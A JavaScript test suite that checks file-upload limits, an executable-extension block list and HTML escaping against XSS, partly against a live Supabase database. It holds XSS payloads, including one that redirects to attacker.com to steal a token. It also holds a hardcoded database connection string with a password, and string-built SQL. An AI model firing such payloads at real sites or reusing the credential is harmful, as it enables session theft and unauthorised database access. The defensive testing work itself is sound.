const { Pool } = require('pg');
const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://postgres.aayqydcdfxhlwizhfjun:4zCbX8YXlhSHMSZFAc7qCXMJFw9!@aws-0-eu-central-1.pooler.supabase.com:5432/postgres'
});

function assert(condition, message) {
    if (!condition) {
        console.error("FAIL: " + message);
        throw new Error(message);
    }
    console.log("PASS: " + message);
}

// Logic replicate from public-action-page.js for unit testing validation engine
const ALLOWED_EXTENSIONS = ['pdf', 'docx', 'xlsx', 'csv', 'png', 'jpg', 'jpeg', 'zip', 'txt'];
const FORBIDDEN_EXTENSIONS = ['exe', 'bat', 'cmd', 'sh', 'js', 'py', 'vbs', 'php', 'jar', 'msi', 'bin', 'dll'];
const MAX_FILES = 5;
const MAX_FILE_SIZE_BYTES = 25 * 1024 * 1024; // 25 MB

function validateFiles(files) {
    if (!files || files.length === 0) return { valid: true };
    if (files.length > MAX_FILES) {
        return { valid: false, error: `Максимальна кількість файлів — ${MAX_FILES}.` };
    }
    for (const f of files) {
        const ext = f.name.split('.').pop().toLowerCase();
        if (FORBIDDEN_EXTENSIONS.includes(ext)) {
            return { valid: false, error: `Файл «${f.name}» має заборонений формат (.${ext}).` };
        }
        if (!ALLOWED_EXTENSIONS.includes(ext)) {
            return { valid: false, error: `Формат файлу «${f.name}» не підтримується.` };
        }
        if (f.size > MAX_FILE_SIZE_BYTES) {
            return { valid: false, error: `Файл «${f.name}» перевищує ліміт 25 MB.` };
        }
    }
    return { valid: true };
}

function escapeHtml(str) {
    if (!str || typeof str !== 'string') return '';
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

async function run() {
    console.log("=== Starting Phase 6D.2 File Validation & Security Guard Suite ===");
    let exitCode = 0;
    const createdOrgIds = [];
    const createdProjectIds = [];
    const createdTaskIds = [];

    try {
        // 1. File Restrictions Validation
        console.log("1. Testing File Count, Size & Extension Restrictions...");
        
        // Max files <= 5
        const valid5 = validateFiles([
            { name: "f1.pdf", size: 1000 },
            { name: "f2.docx", size: 1000 },
            { name: "f3.xlsx", size: 1000 },
            { name: "f4.png", size: 1000 },
            { name: "f5.zip", size: 1000 }
        ]);
        assert(valid5.valid === true, "5 valid files accepted");

        const invalid6 = validateFiles([
            { name: "f1.pdf", size: 1000 },
            { name: "f2.docx", size: 1000 },
            { name: "f3.xlsx", size: 1000 },
            { name: "f4.png", size: 1000 },
            { name: "f5.zip", size: 1000 },
            { name: "f6.txt", size: 1000 }
        ]);
        assert(invalid6.valid === false && invalid6.error.includes("Максимальна кількість файлів"), ">5 files rejected");

        // Oversized file > 25 MB
        const oversized = validateFiles([
            { name: "big_video.pdf", size: 26 * 1024 * 1024 }
        ]);
        assert(oversized.valid === false && oversized.error.includes("перевищує ліміт 25 MB"), "Oversized file (>25MB) rejected");

        // Disallowed Executable / Script Extensions
        for (const ext of ['exe', 'bat', 'sh', 'js', 'py', 'vbs', 'dll']) {
            const forbiddenCheck = validateFiles([{ name: `malicious_payload.${ext}`, size: 1024 }]);
            assert(forbiddenCheck.valid === false && forbiddenCheck.error.includes("заборонений формат"), `Forbidden script .${ext} rejected`);
        }

        // Extension spoofing check (e.g. file.pdf.exe or file.exe.pdf double extension)
        const spoofExe = validateFiles([{ name: "report.pdf.exe", size: 1024 }]);
        assert(spoofExe.valid === false, "Extension spoofing report.pdf.exe rejected");

        // 2. XSS Payload Protection
        console.log("2. Testing XSS Payload Sanitization...");
        const rawXssStrings = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg onload=alert(document.cookie)>',
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        ];

        for (const xss of rawXssStrings) {
            const escaped = escapeHtml(xss);
            assert(!escaped.includes('<script>'), "Sanitization removed unescaped <script>");
            assert(!escaped.includes('<img'), "Sanitization removed unescaped <img");
            assert(!escaped.includes('<svg'), "Sanitization removed unescaped <svg");
            assert(escaped.includes('&lt;') || escaped.includes('&gt;') || escaped.includes('&quot;'), "XSS special chars escaped");
        }

        // 3. Database Injection and Sanitization verification with XSS in task title / client payload
        console.log("3. Testing DB Persistence and Safe Retrieval of User Inputs...");
        const ownerRes = await pool.query("SELECT id FROM public.profiles WHERE global_role = 'owner' LIMIT 1");
        const ownerId = ownerRes.rows[0].id;

        const orgRes = await pool.query("INSERT INTO public.organizations (name, status) VALUES ('Org XSS Test', 'active') RETURNING id");
        const orgId = orgRes.rows[0].id;
        createdOrgIds.push(orgId);

        const pRes = await pool.query(
            "INSERT INTO public.projects (organization_id, name, status, title) VALUES ($1, 'Project <script>alert(1)</script>', 'active', 'Project Title') RETURNING id",
            [orgId]
        );
        const projectId = pRes.rows[0].id;
        createdProjectIds.push(projectId);

        const tRes = await pool.query(
            "INSERT INTO public.tasks (organization_id, project_id, title, description, status, responsibility_type, is_client_visible) VALUES ($1, $2, 'Task <img src=x onerror=alert(1)>', 'Desc <b>alert</b>', 'todo', 'client', true) RETURNING id",
            [orgId, projectId]
        );
        const taskId = tRes.rows[0].id;
        createdTaskIds.push(taskId);

        const gRes = await pool.query(`
            SET LOCAL role TO authenticated;
            SET LOCAL request.jwt.claims TO '{"sub":"${ownerId}"}';
            SELECT public.generate_action_token('${taskId}') AS res;
        `);
        const token = gRes[gRes.length - 1].rows[0].res;

        const publicData = await pool.query("SELECT public.get_public_client_action($1) AS res", [token.raw_token]);
        const pData = publicData.rows[0].res;

        // Verify Data Minimization
        assert(pData.organization_id === undefined, "organization_id hidden in public response");
        assert(pData.project_id === undefined, "project_id hidden in public response");
        assert(pData.task_id === undefined, "task_id hidden in public response");
        assert(pData.raw_token === undefined, "raw_token hidden in public response");

        // Submit XSS payload
        const xssPayload = {
            text: "<script>document.location='http://attacker.com/steal?token='</script>",
            attachments: [
                { name: "<svg onload=alert(1)>.pdf", size: 1024, type: "application/pdf" }
            ]
        };

        const subRes = await pool.query("SELECT public.submit_public_client_action($1, $2) AS res", [token.raw_token, JSON.stringify(xssPayload)]);
        assert(subRes.rows[0].res.success === true, "Submission with XSS payload stored safely without crashing DB");

        const subCheck = await pool.query("SELECT payload, attachments FROM public.task_submissions WHERE task_id = $1", [taskId]);
        assert(subCheck.rows[0].payload.text.includes("<script>"), "Payload stored as raw data (safe parameterized JSONB)");
        assert(escapeHtml(subCheck.rows[0].payload.text).includes("&lt;script&gt;"), "Client-side escapeHtml prevents rendering dangerous script tags");

        console.log("PASS: Phase 6D.2 File Validation & Security Guard Suite passed 100%!");
    } catch(e) {
        console.error("FATAL ERROR in Validation Suite:", e);
        exitCode = 1;
    } finally {
        try {
            await pool.query("SET session_replication_role = 'replica';");
            if (createdTaskIds.length > 0) {
                await pool.query("DELETE FROM public.task_submissions WHERE task_id = ANY($1::uuid[])", [createdTaskIds]);
                await pool.query("DELETE FROM public.client_action_tokens WHERE task_id = ANY($1::uuid[])", [createdTaskIds]);
                await pool.query("DELETE FROM public.tasks WHERE id = ANY($1::uuid[])", [createdTaskIds]);
            }
            if (createdProjectIds.length > 0) {
                await pool.query("DELETE FROM public.project_memberships WHERE project_id = ANY($1::uuid[])", [createdProjectIds]);
                await pool.query("DELETE FROM public.projects WHERE id = ANY($1::uuid[])", [createdProjectIds]);
            }
            if (createdOrgIds.length > 0) {
                await pool.query("DELETE FROM public.organizations WHERE id = ANY($1::uuid[])", [createdOrgIds]);
            }
            await pool.query("SET session_replication_role = 'origin';");
        } catch(e) {
            console.error("Cleanup error in validation suite:", e);
        }
        await pool.end();
        if (exitCode !== 0) process.exit(exitCode);
    }
}

run();
